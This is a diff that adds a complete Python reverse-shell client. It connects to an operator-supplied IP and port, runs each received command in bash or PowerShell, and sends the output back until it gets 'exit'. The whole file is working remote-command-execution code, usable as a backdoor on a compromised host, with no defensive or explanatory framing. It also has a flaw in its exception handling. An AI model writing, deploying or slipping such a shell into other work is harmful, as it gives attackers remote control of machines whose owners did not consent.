@@ -1,0 +1,54 @@
+#!/usr/bin/python3
+import os
+import sys
+import socket
+import subprocess
+
+
+
+class Client:
+
+    def __init__(self,ip: str,port: int,byte_size=1024) -> None:
+        self.ip = ip
+        self.port = port
+        self.byte_size = byte_size
+        self.shell = "powershell" if os.name == "nt" else "bash"
+        
+        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.client.connect((self.ip,self.port))
+
+    def ReciveCommand(self):
+        return self.client.recv(self.byte_size).decode()
+
+    def ExecuteCommand(self,command: str) -> None:
+        try:
+            result = subprocess.run([self.shell,"-c",command],text=True,capture_output=True)
+        except Exception as e:
+            self.client.send(e.args[0].encode())
+        if result.stdout:
+            self.client.send(result.stdout.encode())
+        elif result.stderr:
+            self.client.send(result.stderr.encode())
+        else:
+            self.client.send("The command did not produce any output".encode())
+
+    def Main(self) -> None:
+        while True:
+            command = self.ReciveCommand()
+            if command.lower() == "exit":
+                self.client.close()
+                print("Exiting...")
+                sys.exit()
+            self.ExecuteCommand(command)
+            print(f"command runned:{command}")
+        self.client.close()
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f"Usage: ./{sys.argv[0]} <ip> <port> <byte-size (default is 1024)>")
+        sys.exit()
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    byte_size = int(sys.argv[3]) if len(sys.argv) == 4 else 1024
+    client = Client(ip,port,byte_size=byte_size)
+    client.Main()
